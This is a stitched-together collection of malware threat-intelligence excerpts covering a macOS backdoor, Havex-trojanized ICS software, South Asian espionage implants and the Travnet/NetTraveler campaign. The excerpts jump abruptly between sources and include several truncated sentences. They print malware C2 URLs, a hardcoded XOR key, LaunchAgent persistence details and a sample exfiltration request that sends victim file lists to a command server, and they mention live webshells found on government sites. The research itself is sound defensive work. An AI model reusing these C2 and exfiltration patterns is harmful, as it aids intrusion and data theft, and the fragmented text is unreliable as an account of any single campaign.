The module was created from the same source code as the dropper but instead of installing the backdoor module , it only executes the malicious payload and the decoy application : `` % bundle path % /Contents / Resources/.launchd.app '' `` % bundle path % /Contents / Resources/.Img2icns.app '' ( the original `` Img2icns '' application , http : //www.img2icnsapp.com/ ) .
The module is written in Objective C language and contains 4 classes : AppDelegate , UCHostInf , UCNet , UCUpDownload .
The latter three classes seem to be included from the backdoor 's source code but not used .
All functionality is implemented in the function `` AppDelegate - ( void ) applicationDidFinishLaunching : ( i d ) '' .
The module copies its malicious bundle from `` Contents / Resources/.launchd.app '' to user 's home directory `` /Users/ % username % '' and launches it , effectively activating the backdoor .
Then , it launches the legitimate part of the bundle , `` Contents / Resources / Img2icns.app '' that is the original '' Img2icns '' application ( http : //www.img2icnsapp.com/ ) .
The module is written in Objective C language and contains 5 classes : AppDelegate , UCHostInf , UCNet , UCUpDownload , KEYLogger .
The `` KEYLogger '' class appears to be incomplete .
It is only able to get information about active modifier keys and writes data to a log file : `` $ HOME / Library / log.log '' When started , the module launches an application : `` % application 's bundle path % /Contents/ Resources/.launchd.app '' This code seems to be reused from the dropper module .
Then , it proceeds with installation .
Once the installation is finished , it starts its main thread ( `` UCServerThread '' function ) in an infinite loop .
The module checks if its bundle directory is located in `` /Users/ % username % / '' and if not it copies the bundle to that directory .
It also writes the command `` rm -rf % original bundle path % '' to the file `` /Users/ % username % /.launchd .
This command is then executed by the installed copy of the backdoor , effectively removing the original bundle directory .
Then , it creates a file `` $ HOME / Library / LaunchAgents / apple.launchd.plist '' with all the parameters required to launch the backdoor every time the system starts .
The module retrieves host information and host name and uploads this information to the C2 server .
All data sent to the C & C server is encrypted with the hardcoded XOR key `` * & ~^ % @ 0hh8979 '' .
First , it makes a POST request with URL `` hxxp : //appst0re.net / upload .
After that , it requests commands from the C & C server .
If no data was received , it tries again after sleeping for 120 seconds .
The module requests new commands by making a POST request to the C & C server by URL `` hxxp : // appst0re.net/upload.aspx ? filepath = order & filename= % hostname % .jpg
Monday , 27 October 2014 11:11:00 ( UTC / GMT ) I did a presentation at the 4SICS conference earlier this week , where I disclosed the results from my analysis of the Havex RAT / backdoor ( slides available here ) .
The Havex backdoor is developed and used by a hacker group called Dragonfly , who are also known as '' Energetic Bear '' and `` Crouching Yeti '' .
Dragonfly is an APT hacker group , who have been reported to specifically target organizations in the energy sector as well as companies in other ICS sectors such as industrial / machinery , manufacturing and pharmaceutical .
In my 4SICS talk I disclosed a previously unpublished comprehensive view of ICS software that has been trojanized with the Havex backdoor , complete with screenshots , version numbers and checksums .
Dale Petersen , founder of Digital Bond , expressed the following request regarding the lack of public information about the software trojanized with Havex : If the names of the vendors that unwittingly spread Havex were made public , the wide coverage would likely reach most of the affected asset owners .
Following Dale 's request we decided to publish the information presented at 4SICS also in this blog post , in order to reach as many affected asset owners as possible .
The information published here is based on our own sandbox executions of Havex malware samples , which we have obtained via CodeAndSec and malwr.com .
In addition to what I presented at 4SICS , this blog post also includes new findings published by Joel `` scadahacker '' Langill in version 2.0 of his Dragonfly white paper , which was released just a couple of hours after my talk .
In Symantec 's blog post about Havex they write : Three different ICS equipment providers were targeted and malware was inserted into the software bundles The first vendor known to have their software trojanized by the Dragonfly group was the Swiss company MESA Imaging , who manufacture industrial grade cameras for range measurements .
The second vendor to have their software trojanized was the Belgian company eWON , who provide a remote maintenance service for industrial control systems called `` Talk2 M '' .
A corrupted eCatcherSetup.exe file had been uploaded into the CMS ( Content Management System ) of www.ewon.biz web site .
The corrupted eCatcherSetup.exe contained a malware which could , under restricted conditions , compromise the Talk2 M login of the infected user .
Prior to version 2.0 of Joel 's Dragonfly report , eCatcher was the only product from eWON known to be infected with the Havex backdoor .
However , Joel 's report also listed a product called `` eGrabit '' , which we managed to obtain a malware sample for via malwr.com .
The most recent company known to have their software infected with the Havex backdoor was the German company MB Connect Line GmbH , who are known for their industrial router mbNET and VPN service mbCONNECT24 .
The files mbCHECK ( Europe ) , VCOM_LAN2 and mbCONFTOOL have been replaced with infected files .
These files were available from 16th of April 2014 to 23th of April 2014 for download from our website .
All of these files were infected with the known Trojan Virus Havex Rat .
Notice how only mbCHECK for users in Europe was trojanized , there has been no report of the USA / CAN version of mbCHECK being infected with Havex .
We have not been able to get hold of a malware sample for the trojanized version of VCOM_LAN2 .
The screenshot below is therefore from a clean version of this software .
The vendors who have gotten their software trojanized by Dragonfly are all European ICS companies ( Switzerland , Belgium and Germany ) .
Additionally , only the mbCHECK version for users in Europe was infected with Havex , but not the one for US / Canada .
These facts indicate that the Dragonfly / Energetic Bear threat actor seems to primarily target ICS companies in Europe .
We 're currently working on a follow - up blog post , which shows how to detect and analyze network traffic from ICS networks infected with Havex .
Threat Connect Threat Intelligence Why Threat Intelligence is Important How to Develop Threat Intelligence Community Collaboration Case Study Platform Capabilities Integrations ThreatConnect™ API ThreatConnect™ Cloud Cloud Security Upgrade Communities Private Communities Moderated Common Community Moderated Subscriber Communities Intelligence Research Team Data Privacy Methodology Diamond Model of Intrusion Analysis Threat Inference Engine Collaborative Intelligence News & Events In The News Press Releases Blog About Leadership Careers Contact Us Login Home News Posted August 2 , 2013 by TCIRT & filed under Research .
The global proliferation of cyber espionage may be serving as a catalyst for regional entities within South Asia to adopt their own cyber espionage capabilities .
Irrespective of the threats sophistication or motivation , South Asian cyber threats are likely emulating behaviors of larger regional powers to strategically influence national , organizational or individual objectives .
The ThreatConnect Intelligence Research Team ( TCIRT ) has identified an example of South Asian cyber espionage that is likely transcending sectors and regional geographic boundaries .
Analyses of multiple customized malware binaries hosted within a small U.S. subnet have likely been used to target Indian military or government entities .
The malware contains specific artifacts that point to a commercial Pakistani entity .
Although the TCIRT can not conclusively confirm direct involvement , several hypotheses have been developed which may account for the malware and observed activity .
All of the following information and threat indicators are available within ThreatConnect.com and have been shared with the ThreatConnect community .
Operational Caveat : The ThreatConnect Intelligence Research Team has contacted the affected service providers and notified them of the activity observed .
Details associated with this threat have been shared with the ThreatConnect Community within Incident `` 20130731A : South Asia Cyber Espionage Heats Up '' .
Globalization has woven the Internet into a fabric that interlaces practically every aspect of modern living .
Throughout the years , as evidenced in countless media reports , world superpowers have recognized and utilized the Internet as a powerful source for intelligence collection , and on occasion we have been offered glimpses as to how they are leveraging cyber espionage in support of their national diplomatic , military or economic objectives .
Similar to a younger sibling looking up to a big brother , regional and middle powers within South Asia are seeking to leverage global cyber espionage in an effort to achieve parity with nation states who have far - reaching diplomatic power , modernized militaries and influential economies .
Ultimately , these emergent economies are likely seeking to hasten their path to success in fulfilling national objectives via the `` short - cut '' that cyber espionage offers .
Individual countries within the Indo - Pak subcontinent are increasingly involved in cyber attacks and targeted espionage campaigns .
South Asia is no stranger to deeply rooted conventional conflict which is most often a strong harbinger of cyber conflict .
On March 17th , 2013 , the Norwegian - based , global telecommunications provider Telenor reported a network breach from an unknown sophisticated threat actor that targeted Telenor executives using custom malware implants .
The attackers were responsible for pilfering email archives and documents from Telenor executives , compromising their intellectual property and business operations .
Nearly two months later , the Norwegian antivirus and security firm Norman issued an investigative analysis report titled Operation Hangover : Unveiling an Indian Cyberattack Infrastructure that detailed cyber espionage activities associated with the Telenor compromise .
They noted similar targeting campaigns that were observed exploiting numerous industries and organizations within Norway , Pakistan , US , Iran , China , Taiwan , Thailand , Jordan , Indonesia , UK , Germany , Austria , Poland , and Romania .
Norman speculated that a group associated with an identified private Indian information security company likely carried out the espionage campaigns .
Norman 's 43 page assessment concluded that a sophisticated Indian exploitation team was indeed responsible for the network breach and Telenor compromise .
The TCIRT believes that a possible theory that supports an Indian attack scenario is that the Telenor subsidiary , Telenor Pakistan , is a strategic communications infrastructure provider .
Telenor Pakistan provides voice , data content and mobile communications to more than 3,500 cities and towns within Pakistan .
Persistent remote Indian access to a strategic communications service provider , such as Telenor Pakistan , would certainly yield unparalleled signals intelligence collection capability .
The information obtained would be of strategic value to Indian intelligence services .
In light of the recent revelation of Indian involvement in the targeting of Telenor , it is critical for us to consider the borderless nature of cyber espionage and to understand how regional cyber conflicts can spill across geographies and affect critical commercial business operations .
As part of an ongoing TCIRT focused research and analysis , we have found custom malware being used operationally `` in the wild '' that may be targeting Indian military and government related entities , as well as other unidentified South Asian targets .
This activity is possibly linked to an identified Pakistani information security company .
In late May 2013 , TCIRT identified a malicious file hosted at [ http : // ] 199.91.173 [ .
This file was a self - extracting ( SFX ) archive that , when executed , presents the target victim with a 12 page decoy PDF document .
The document was an official Government of India ( GoI ) , Ministry of Defense ( MoD ) pension memorandum of record .
It is highly likely that the malware and decoy document would be tailored for and delivered to specific recipients associated with the GoI or MoD .
The SFX dropper contained multiple custom executable files , as well as legitimate Microsoft Visual C++ Runtime Library files , which are part of the codebase used to develop and required to execute the backdoor code .
The malware also uses the legitimate cURL library in the form of libcurld.dll .
The open - source cURL library is a multiprotocol transfer library used primarily for FTP and HTTP transactions .
The main backdoor component is found in winsocks.exe .
The files ExtractPDF.exe and Start.exe simply serve as utilities to open the PDF file and execute the winsocks.exe backdoor component .
When executed , the winsocks.exe backdoor requests a PHP update callback at [ http : // ] 199.91.173 [ .
A version.txt file is also requested by the malware .
This file contained a version number 1.0 , likely denoting the version of the backdoor and/or the command and control ( C2 ) backend .
The winsocks.exe backdoor also contains hardcoded strings of Office file extensions , telegraphing the likely intention of the attackers in collecting and exfiltrating office automated documents from victim networks .
Another variant of this backdoor uses the same winsocks.exe with a different dropping mechanism and was found at [ http : // ] 199.91.173 [ .
Both of these .scr
In this SFX , Windows batch files had replaced the ExtractPDF.exe and Start.exe with a decoy Flash video ( FLV ) file was used in place of the decoy PDF .
An FLV file is an interesting choice of decoy document since it is not a standard video format for media players .
The dynamic DNS domains windowsupdate.no- ip [ .
When opened the flash video simply displays a couple kissing passionately .
Implementing the use of free dynamic DNS services , such as those of NO - IP within targeting and exploitation phases of attack , are very common techniques used by a variety sophisticated threat groups .
The file sarbajit_leaked_video.wmv.scr contains a compile time of May 28 , 2013 19:53:26 UTC .
The filename is possibly a misspelled reference to Sarabjit Singh , an Indian national who was arrested and convicted of terrorism and espionage charges in 1991 by Pakistani authorities .
After a protracted 22 year legal battle , Sarabjit Singh would become the victim of a severe beating by Pakistani prisoners and would later die of his injuries in a Lahore hospital on May 2 , 2013 .
News of the attack and subsequent death of Sarabjit Singh incited protests in India that increased regional Indo - Pakistani tensions and served as a catalyst for bilateral governmental negotiations between Delhi and Islamabad .
This file was created 26 days after the death of Sarabjit Singh , and would be of relevance to targeted Indian entities , much like the official Government of India ( GoI ) , Ministry of Defense ( MoD ) pension memorandum .
Operational Caveat : It is important to note that there are information gaps which diminish our ability to establish a definitive explanation for the malicious activity and identify the responsible entities behind the authorship and use of the identified malware .
Below the TCIRT simply highlights the facts associated with specific artifacts identified within the malware .
Most of the dropped malware binaries contained a debug string that sheds light on the possible developers and operators of the malware .
The significance of the username Tranchulas within the debug path of the winsocks.exe binary is that Tranchulas is a Pakistani information security consulting company with offices in the United Kingdom , United States , and Pakistan .
The CEO of Tranchulas is Zubair Khan , a Pakistani national and information security executive who has `` been researching mainly on [ sic ] cyber warfare '' .
Khan also likely maintains a close relationship to the Pakistani government .
According to this online biography , he is responsible for the penetration testing of Pakistani homeland security solutions and has consulted for the Pakistani National Database and Registration Authority ( NADRA ) .
Proximity to such sensitive security programs suggest a certain level of trust on behalf of the Pakistani government , and may indicate that official Pakistani entities could have access to Tranchulas technical support for various security projects or programs .
An ironic , yet noteworthy observation is that the Tranchulas website boasts Telenor as a client .
Tranchulas also serves as an official sponsor for the Pakistan CERT in addition to maintaining the official Pakistan CERT website ( cert.org.pk ) .
On July 2 , 2013 a similar file windefender.exe ( MD5 : a21f2cb65a3467925c1615794cce7581 ) was identified containing a strong association to Tranchulas .
This particular binary contained the following debug string : C : \Users\umairaziz27\Documents\Visual Studio 2008\Projects\usb\Release\usb.pdb The username `` UmairAziz27 '' reveals a Twitter account @ umairaziz27 for an `` Optimistic Patriot by choice '' who is `` Working as InfoSec Analyst at @ Tranchulas .
A second host within the same 199.91.173 [ .
The OBL_Leaked_Report.zip contained a .scr
This OBL malware drops a windefender.exe backdoor component ( MD5 : 35663e66d02e889d35aa5608c61795eb ) In this case , the debug string is : C : \Users\Cert - India\Documents\Visual Studio 2008\Projects\ufile\Release\ufile.pdb .
The binaries that contain the `` umairaziz27ʺ″ and `` Cert - India '' debug strings are designed to call back to [ http : // ] 199.91.173 [ .
Meanwhile , the Naxalites_Funded_By_Pakistan.scr file drops a slightly different malware component and an alternate decoy document .
The dropped implant , showppt.scr ( MD5 : 165ac370b54e664812e4c15b2396ccd6 ) , is a downloader that connects to [ http : // ] 199.91.173 [ .
The use of Tranchulas and UmairAziz27 in the malware debugging paths , in addition to the multiple targeting campaigns that maintain themes likely aimed at Indian entities or involving Pakistan related issues , leads us to assess the following competing hypotheses which may be considered as plausible explanations for the identified activity : Hypothesis 1 : Tranchulas developed the malicious binaries , and staged them for offensive exploitation operations on behalf of an unidentified customer .
Hypothesis 2 : Tranchulas developed and sold the malicious binaries to an unidentified customer , where they were later operationalized by an unidentified entity .
Hypothesis 3 : An unidentified third party unaffiliated with Tranchulas developed the malware , deliberately including misleading software artifacts as a direct effort to create speculation and shift blame toward Tranchulas .
Hypothesis 4 : A rogue Tranchulas employee used company resources without company knowledge to develop the malware , where an unknown operator later used it offensively .
Hypothesis 5 : Indian entities actively sought and utilized the services of Pakistan based information security company , Tranchulas , for an officially sanctioned and authorized penetration test .
The malicious implants were subsequently developed and used as part of official Tranchulas service offerings , while the files and infrastructure used for the audit were submitted to publicly available malware analysis services .
Hypothesis 6 : An unidentified Indian entity developed and used this malware as a realistic simulated exercise to perform penetration testing and evaluate their readiness in the event of actual Pakistani affiliated offensive network operations .
The files and infrastructure used for the simulation were submitted to publicly available malware analysis services .
Considering the long - standing regional tensions between India and Pakistan , South Asia serves as a likely flashpoint for conventional conflict to carry over and play out within cyberspace .
Public and private sectors alike should begin to increase their awareness of emerging cyber threats from the lesser - known middle powers .
Regardless of sophistication , these threats may support future belligerents who have or will eventually possess the capability and intent to disrupt critical business operations .
Details associated with this threat have been shared with the ThreatConnect Community within Incident `` 20130731A : South Asia Cyber Espionage Heats Up '' .
If you or your organization is interested in obtaining crowd - sourced threat intelligence that increases your awareness of emerging cyber threats , please register at ThreatConnect.com and join our community .
Tags : Cyber Espionage , India , Pakistan , South Asia , Telenor Previous article Next article No Comments Search the Site ...
The objective of this report is the following :  An overview of malware distribution in Indian Cyberspace  Detailed , in - depth technical analysis of Advanced Persistent Threat ( APT ) actors against India  Enumerate the primary technical causes leading to successful attacks  Recommendations to improve and protect the overall Critical Information Infrastructuren CERT - ISAC is India 's first Independent CERT for mobile and electronic security .
Established by the non - profit scientific foundation `` Information Sharing and Analysis Center '' ( ISAC ) that manages the National security Database ( NSD ) program , CERT - ISAC has a dedicated 30 seat threat intelligence monitoring center at New Delhi and Mumbai to monitor constant threats and attacks on the India Cyber Space .
The Po Engine is currently used by CERT - ISAC for malware analysis and certification of mobile apps for security and privacy .
The report goes on to document a detailed analysis of targeted malware and lists a small number of Indian - based companies that were potentially threat actors involved in the campaign .
While the ' Hangover ' report itself has been widely debated in the Indian Information Security community , there is little proof , beyond circumstantial evidence provided in the Norman report , that Indian actors were behind this APT campaign , and the larger concern remains that India is the victim of numerous APT campaigns , rather than an instigator of this threat .
As our Government is rapidly migrating towards e - governance , it is vital to ensure a robust approach to data security is implemented from an early stage to prevent misuse and subsequent attacks on critical infrastructure and the national economy .
A quick look at India 's history with respect to battling cyber threats , reveals an age- old & on - going war between the `` hackers '' from various Nations .
Defacement of Indian government sites date back to the year 2003 & even today , they continue to happen .
In this report , we analyse the various facts and provide in - depth analysis of an `` Advanced persistent threat '' attack on India that makes us ask – Are we the hunter or the hunted ?  Part one – Hunter or the Hunted ?  Part two – Advanced persistent threat - analysis  Part three - Primary Causes  Part four - Recommendations '' Advanced persistent threat '' or APT as it is known , is a reality today .
Unlike the regular script - kiddie attacks that are carried out usually for fun or for fame , APTs are serious campaigns , undertaken by groups with a variety of skill - sets .
The focus of an APT campaign usually is to gather valuable information against specific companies / organizations or selected sectors of a country .
These usually begin with highly targeted spear - phishing attacks .
Out of 25,935 websites scanned by Google , 14 % websites were infected by Malware .
The following table should give us a good idea of how things are shaping up .
It 's not surprising to note that the threats are increasing at an alarming rate , year after year .
In a way , it 's heartening to observe the CERT evolve & rise upto newer challenges & latest threats .
Unfortunately , it 's not enough .
The reports submitted by CERT do not take into account the most fundamental aspects of maintaining a state of secure IT environment .
This fact is evident from the number of security incidents that happen over an year & how the right authorities react to them .
If every reported incident was handled properly by identifying the root cause , followed by a full security audit , we wonder if the numbers would grow so fast .
As mentioned earlier , cases of government sites being defaced date back to 2003 .
Even today , one can find servers running older & vulnerable versions of software , poor server management , web applications deployed on these servers being designed & implemented by programmers who lack awareness of secure coding practices , to name a few .
The private sector though , is much more cautious & alert when it comes to their IT infrastructure compared to the government .
Let 's analyse the state of government 's IT infrastructure in the following pages .
While the statistics presented by CERT - In looks alarming by itself , the actual state of domains that end with '' gov.in '' , is much worse .
A quick look at the following recent screenshot of www.zone-h.org site provides some shocking insight .
According to the site , the current statistics are as follows : Total Notifications : 1299 Mass defacements : 753 A recent incident that caught our attention was the `` Travnet '' case .
We carried out a preliminary analysis of our own on the subject .
Kaspersky as well as McAfee amongst others , have published detailed analysis of the malware & the campaign .
Our focus was to understand the nature of the group behind the attack & its agenda .
It began with Kaspersky 's revelation of the attack .
We recommend you to go through Kaspersky & McAfee 's analysis of the malware to know more about the spear phishing campaign & the exploits used .
Our analysis is currently focussed only on the malware samples that are dropped on the target systems , as the exploits used during the spear - phishing campaign are older & already patched by the respective vendors .
To summarize the modus operandi of the attack , targeted phishing mails were sent to individuals , having Office documents as attachments .
These documents exploited previously known vulnerabilities ( CVE-2012 - 0158 and CVE-2010 - 3333 ) to drop `` Travnet '' malware onto the systems .
Its fascinating to note that the attachments that were sent to Indian targets were carefully selected & some of them were named as follows :  `` Army Cyber Security Policy 2013.doc ''  `` Jallianwala bagh massacre a deeply shameful act.doc ''  `` Report - Asia Defense Spending Boom.doc ''  `` His Holiness the Dalai Lama 's visit to Switzerland day 3.doc ''  `` BJP wo n't dump Modi for Nitish NDA headed for split.doc '' As its evident , the group behind the attack obviously has done extensive research on topics that are current as well as intriguing to the Indian targets .
We managed to acquired 2 variants of the `` Travnet '' malware & our analysis of the same is as follows .
File details : A quick analysis by PEiD reveals that the binary is not packed or protected .
It begins by creating a new mutex object , named `` INSTALL SERVICES NOW ! '' .
Next step is to create a configuration file named `` config_t.dat '' in the windows ' `` system '' folder .
It then populates it with the right parameters , after decoding them .
After the configuration file is written , it checks if the malware was previously installed or not , if not , it creates a dynamic - link library in the `` system32 '' folder , creates a temporary batch file named as `` temp.bat '' which installs the previous DLL as a service on the system .
The name of the DLL that is created , is based upon the values of the data from `` netsvcs '' from the following registry key : `` HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost '' .
During this runtime , it turned out to be `` 6to4ex.dll '' but it can change from runtime to runtime . The malware then deletes the batch file .
Its obvious that this executable basically acts as a dropper .
The contents of the batch file & the configuration file generated are as follows .
Batch file : temp.bat Configuration file : config_t.dat Next section focuses on the analysis of the DLL ( `` 6to4ex.dll '' ) that was dropped by this executable .
Analysis of `` 6to4ex.dll '' File Details A quick analysis by PEiD reveals that the binary is not packed or protected .
Now , as we know already , this DLL was installed as a service by the previous dropper .
Analysis of the '' ServiceMain '' function of the DLL throws light on many interesting things .
The first thing it does upon execution is to create a new mutex object named `` NetTravler Is Running ! '' .
Its usually done to avoid running multiple instances of the same malware .
Next , it reads the configuration file .
Additionally , it also creates few interesting files in the `` system32 '' folder .
The filenames are quite indicative of what their contents might be .
The contents of the files are as follows Filename : `` system_t.dll '' Upon proper character encoding & use of google 's Translate feature , it turns out to be `` Chinese '' .
Filename : `` enumfs.ini '' Filename : `` dnlist.ini '' Another interesting aspect of Travnet is that it can specifically search for files of the type `` doc , docx , xls , xlsx , txt , rtf , pdf '' on the victim machine .
This provides enough hint that this malware was designed to steal confidential information unlike the usual botnet variants that focus primarily on providing remote access to the system or to act as zombies for launching DDOS attacks .
To summarize , the Travnet malware initially collects system information , a list of files on the victim machine among others , then sends this data to the remote Command & Control ( C & C ) server , by using custom compression & encoding functions .
The malware creates a new file with the naming convention as follows : '' travlerbackinfo- % d- % d- % d- % d- % d.dll '' , where the signed integer values are replaced by the current system date & time , copies the content of `` system_t.dll '' into it & then , uploads it to the C & C .
It also uploads the list of files found on the victim machine , which was saved in the `` enumfs.ini '' file to the remote server , by copying its contents to a new file , named following this format : `` FileList- % 02u % 02u- % 02u % 02u % 02u.ini '' It does n't stop at that , it even uploads the victim 's files onto the remote C & C that have the file extensions `` doc , docx , xls , xlsx , txt , rtf , pdf '' as well as the files on the victim 's desktop folder .
Another important aspect of Travnet is the fact that it uses a custom compression & encoding algorithm on the data collected , before its sent to the remote C & C .
A typical file upload communication between the bot & the C & C looks like this : An actual HTTP GET request looks like this : '' http : //www.newesyahoo.com / traveler1/net / nettraveler.asp ? hostid=00CD1A40 & hostname = ComputerName & ho stip=127.0.0.1 & filename = FileList-0523- 131103.ini & filestart=0 & filetext = begin : : RgAxAC2QzebTgdToZTkXQaCicYTaZR72HWSigYTPHjEZDUZTvgBrOEmQ0 nIxm86m46D0YTg * : : end '' Here , the data between `` begin : : '' & `` : : end '' is the actual file content , that was compressed & encoded by the bot .
It seems that this older variant of the Travnet malware supported 4 different types of commands from the remote C & C and they are as follows :  UNINSTALL  UPDATE  RESET  UPLOAD That concludes Part - A of our Travnet analysis .
File details : A quick analysis by PEiD reveals that the binary is not packed or protected .
This executable is apparently an updated variant of Travnet .
The major changes are as follows :  It 's an executable & not a DLL .
Apart from these , there is n't much difference .
The following analysis only focuses on what has changed .
It achieves persistence by copying itself to the currently logged - in user 's `` temp '' folder as `` csmss.exe '' & placing a shortcut to it , named as `` seruvice.lnk '' in the `` startup '' folder .
The next step it to create a new mutex object to avoid running multiple instances .
It names the mutex as '' Assassin '' .
After this , it generates a unique 8 characters long `` hostid '' , based on volume serial number to identify the bot .
This is common to the previous variant too .
Then it checks if the victim machine is connected to the internet or not , by trying to resolve `` smtp.live.com '' & if that fails , as a second attempt , `` smtp .. yahoo.com '' .
The strings displayed above , are actually in `` Chinese '' & turn out to be :  `` You can connect to the network .
It just makes a list of all files & folders on the victim machine & dumps it into a file named as '' AllIndex.ini '' .
Next step is to compress the contents of this file , copy the compressed content to a new file named as `` AllIndex.ini_d '' & then delete the previously created clear - text file .
The contents of both the files are as follows : Filename : AllIndex.ini Filename : AllIndex.ini_d It 's pretty obvious that the compression ratio achieved by the custom algorithm is quite high from the following image : Apart from that , this variant also creates a file that lists all the currently running processes on the victim machine , into a text file named `` Process.dll '' inside the currently logged - on user 's `` temp '' folder .
This variant also uses a modified naming convention to upload files onto the remote C & C .
The only other major difference from the previous variant is the fact that this one only supports 2 commands from the remote C & C server , instead of 4 & they are as follows :  Uninstall  Upload The C & C server in case of this variant was located at : `` http : //www.viprambler.com / newsinfo / uld / nettraveler.asp '' Apart from analyzing the malware samples , we also tried to gather as much information about the C & C servers as we could .
The fact that even after a lot of research papers being published on the analysis of the Travnet malware , some of the C & C servers are still active & functioning , is noteworthy .
We were able to locate a few of them .
The ones that caught our attention are currently hosted on these domains :  www.pkspring.net  www.viprambler.com Let 's start with the analysis of `` www.viprambler.com '' .
The above record is just one of the findings that supports the claim .
Its interesting to note that the domain was recently registered , is locked & expires in 2014 .
Another interesting observation is the address of the registrant .
Its also noteworthy that the domain is still active & still hosting the Travnet C & C .
We ' ve also observed that the C & C now remains active only during specific time of the day .
The time - stamp from the images below , confirms this .
Active response from the C & C : C & C server refusing connection later on the same day : Its obvious that even after the discovery of the malware , the group behind this specific attack is determined to keep it alive .
The Travnet malware as well as its C & C infrastructure is constantly evolving .
Lets move onto the next active domain .
The Travnet C & C hosted at `` pkspring.net '' seems to be fully functional & active all the time .
The response from the server when opened from a browser is as follows : Another interesting finding is the fact that it hosts Travnet C & C on 3 different ports on the server .
They are as follows :  80  443  8080 Its evident from the following pictures .
Port 443 Port 8080 Moving on , we found out that 21 domains are hosted on the same server at the moment .
And all of them are active C & C servers for the Travnet malware .
They also seem to have interesting domain names .
Its an indication of the seriousness of the campaign .
Other domains hosted & owned by the same group on the same server / IP : The image below proves that all of the above domains serve the same Travnet C & C on the same 3 ports , each .
After this , we focused our attention on the WHOIS details of these domains .
At the moment , the details of the registrant is kept private & it was recently updated .
Its also interesting to note that the group behind this has ensured that the domain can not be taken over by someone else .
The following page contains the current WHOIS data for the domain .
But thanks to older WHOIS records , we found out some interesting facts .
The same domain was earlier registered as follows : It was apparently created on 20-march-2009 & its expiration date was set to 20-march-2013 .
The registrant 's information at that time was as follows : The above data seems familiar .
The only difference now being that the domains have be renewed , registration details kept private & the email ID of the registrant has changed from `` livep92 @ hotmail.com '' to '' chenjm @ sina.com '' , which belongs to a private Chinese mail service ( http : //mail.sina.com.cn/ ) .
The same thing has happened with other publicly disclosed Travnet C & C domains .
We also fetched details of another domain that previously hosted Travnet C & C & has been recently renewed , most likely by the same group .
A search for the email `` livep92 @ hotmail.com '' led us to the following page : The above listed domains are already known to have hosted the Travnet C & C .
We did some research on the current status of one of the domains from the above list , `` discoverypeace.org '' .
The current WHOIS data for the domain `` discoverypeace.org '' is as follows : This looks strikingly similar to the current status of the active C & C domain `` pkstring.net '' .
It was also recently updated .
The older WHOIS entry for the same domain was as follows : From our analysis of the Travnet malware so far , it 's quite evident that many things hint at the origin of this campaign to be from China .
It 's also a known fact the Indian government & other important sectors from India were heavily targeted during this campaign .
T The fact that this was a highly targeted attack & focused on stealing confidential documents & sensitive information makes it noteworthy .
What are the primary causes of weak Indian Cyber Space ? Another interesting finding is the fact that many of the servers that host `` gov.in '' sites are running outdated software versions .
As an example , from the above image , it is evident that the domain `` karnataka.gov.in '' is hosted on a server running '' Windows Server 2003 '' , on 22-June-2013 .
To confirm this , we ran an nmap scan & it 's not surprising to find out that the information is true .
The screenshot of our nmap scan is as follows : While use of outdated software is one of the major concerns , it seems most of the Indian government sites are riddled with vulnerable code too .
It 's quite common to locate webshells on these sites .
One of the many live webshells we found recently during our analysis is shown in the following image : From the time - stamps on the above image , it 's evident that this is webshell is still active at the time of this this writing .
An example of a government site that 's not properly managed & discloses highly sensitive information is as follows : The above screenshot is just one of the many live examples of poorly managed web servers that do not follow even the most basic web application security guidelines .
Even important government sites , access to which can lead to much deeper intrusion seem to be managed with little care .
The following image is just one of the examples of developing or customizing a CMS & not properly handling access - control .
While defacements are usually carried out by hackers just for fun or fame , in a way its a boon in disguise .
Serious hackers can cause much more damage & remain unnoticed for a very long time by having access to the privileges these hackers abuse to deface the site .
Slowly but steadily , serious APT campaigns are on the rise .
Its very important for the nation to start upgrading its IT infrastructure & keep up with the latest security guidelines & practices .
The next part of this research paper focuses on a recent APT campaign against multiple countries including India was targeted .
While each and every technical cause for weak Indian Cyber space is beyond the scope of this document , we also believe that India requires a strong policy driven approach along with inspiring leadership from thought leaders and Government departments in Information security to bring the much needed change .
We recommend the following The Domain name acquisition , management and maintenance policy should address the process to protect and manage the crucial online identities of Indian Government Domains .
At present there is no consistent policy to acquire and manage the domains .
The policy should address : 1 .
Naming convention to be followed for official Government domains to prevent misuse by domain squatters 2 .
A Government body that is responsible to register , administer and manage the domains 3 .
Consistent working administrative and management contacts for WHOIS query 4 .
Systematic policy to acquire domains and renew them on timely basis 5 .
A policy to ensure `` Domain Authorization keys '' are managed properly and maintained in proper chain of custody , secured in a bank locker and handled with systematic process It is crucial to select the right vendors for developing security websites and web applications for all Government projects .
The policy should address : 1 .
Qualification parameters for selection of vendor for web site and web application development 2 .
Certified Staff by vendor working on Government projects for Information security and secure coding 3 .
Quarterly vulnerability assessment and penetration testing of all websites 4 .
Security Classification of websites that determine parameters of vendor approval 5 .
Comprehensive development and support contract from vendor that covers data security and associated penalties in event of breach While it is possible that such a policy exits with organizations such as NIC , it is important to ensure these are implemented in a timely manner .
The policy on patch management must ensure outdated software must be secured appropriately and updated as per Industry standards .
The policy must address : 1 .
Adequate test bed environment for testing new updates for software , patches etc 2 .
Comprehensive UAT ( User Acceptance Testing ) before implementation of critical security patches 3 .
Policy to ensure critical security updates are deployed within a specified time from date of release 4 .
Backup of data and roll back methodologies in event of patch deployment issues 5 .
Monitoring of critical updates and patches and appropriate classification of the same for deployment India has a strong community of Information security experts who can support the Indian Government and strengthen overall security of our cyber space .
As the nature of such community is dynamic and rapidly evolving , it is important for the Indian Government to setup a policy and process for responsible full disclosures when Indian citizens report possible vulnerabilities in critical digital assets of India .
These must address : 1 .
Process by which any citizen of India can safely submit and report vulnerabilities , full disclosures in Indian websites to an authorized agency without fearing action of IT Act law 2 .
Guidelines under which , the security experts from the Indian community can communicate , assist and support law enforcement and responsible agencies in effectively addressing security gaps in Indian Cyber space .
Process to act on security incidents reported by the security community in a timely manner .
Guidelines to industry at large on how to cooperate with security experts who disclose security issues in their organizations 5 .
Guidelines to the citizens on being Cyber aware and how to help the Government in securing the economy of the country from malicious hackers National Security Database ( NSD ) is a prestigious empanelment program awarded to credible & trustworthy Information security experts with proven skills to protect the National Critical Infrastructure & economy of the country .
The National Security Database project has been generously endorsed and supported by NTRO and CERT and has been playing an important role in raising the cyber safety awareness across the Nation as well as engaging the community in improving the overall cyber space of India .
We sincerely believe that in coming years , the program will create a strong and credible cyber workforce that can help the Indian Government in both offense and defence of its Cyber Space .
This report describes multiple cyber - espionage campaigns that have successfully compro- mised more than 350 high profile victims in 40 countries .
The focus of the paper is to describe NetTraveler , which is the main tool used by the threat actors during these attacks .
